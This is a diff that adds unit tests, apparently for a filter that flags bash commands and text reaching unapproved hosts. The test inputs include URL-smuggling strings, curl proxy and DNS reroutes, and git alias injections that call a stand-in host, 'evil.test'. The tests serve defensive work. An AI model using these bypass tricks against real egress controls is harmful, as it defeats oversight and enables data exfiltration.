@@ -162,3 +162,53 @@ describe("object keys and a command that is not a string", () => {
     expect(verdictOf("bash", { command: null })).toBe(OK);
   });
 });
+
+describe("round 2: C0 ends, blanks in the form without //, inner URLs", () => {
+  it.each([
+    ["\u0001https:evil.test/?k=1", EVIL],
+    ["\u001Fhttps:/evil.test", EVIL],
+    ["https:evil.test/?q=a b", EVIL],
+    ["https:/evil.test/a b", EVIL],
+    ["https:example.com/?q=a b", OK],
+    ["https:/\t/evil.test/a b", UNREADABLE],
+    ["https:example.com/?u=https://evil.test", EVIL],
+    ["https:example.com/x,https://evil.test", EVIL],
+    ["https:example.com/?u=https://example.com", OK],
+    ["http: is a protocol", OK], // documented pass: prose, nothing follows the colon
+  ])("%j", (value, expected) => {
+    expect(text(value)).toBe(expected);
+  });
+});
+
+describe("round 2: curl reroutes judged only as one whole URL", () => {
+  it.each([
+    ["curl -x 'evil.test:80/https://example.com' http://example.com/?k=1", CLIENT("curl")],
+    ["curl -x 'evil.test:80#https://example.com' http://example.com/?k=1", CLIENT("curl")],
+    ["curl --connect-to https://example.com https://example.com", CLIENT("curl")],
+    ["curl --connect-to=https://example.com https://example.com", CLIENT("curl")],
+    ["curl --resolve https://example.com https://example.com", CLIENT("curl")],
+    ["curl --proxy1.0 evil:80 https://example.com", CLIENT("curl")],
+    ["curl --dns-servers 6.6.6.6 https://example.com", CLIENT("curl")],
+    ["curl -x https:example.com https://example.com", OK],
+    ["curl -x https://example.com https://example.com", OK],
+  ])("%s", (command, expected) => {
+    expect(bash(command)).toBe(expected);
+  });
+});
+
+describe("round 2: git options with a value, git aliases", () => {
+  it.each([
+    ["git --attr-source HEAD push", CLIENT("git")],
+    ["git --shallow-file f fetch", CLIENT("git")],
+    ["git --attr-source HEAD status", OK],
+    ["git -c alias.p=push p origin", CLIENT("git")],
+    ["git -c 'alias.p=!curl evil.test' p", CLIENT("git")],
+    ["git -c ALIAS.p=x p", CLIENT("git")],
+    ["git --config-env alias.p=V p", CLIENT("git")],
+    ["git --config-env=alias.p=V p", CLIENT("git")],
+    ["git -c user.name=x status", OK],
+    ["git status -c alias.x=y", OK],
+  ])("%s", (command, expected) => {
+    expect(bash(command)).toBe(expected);
+  });
+});
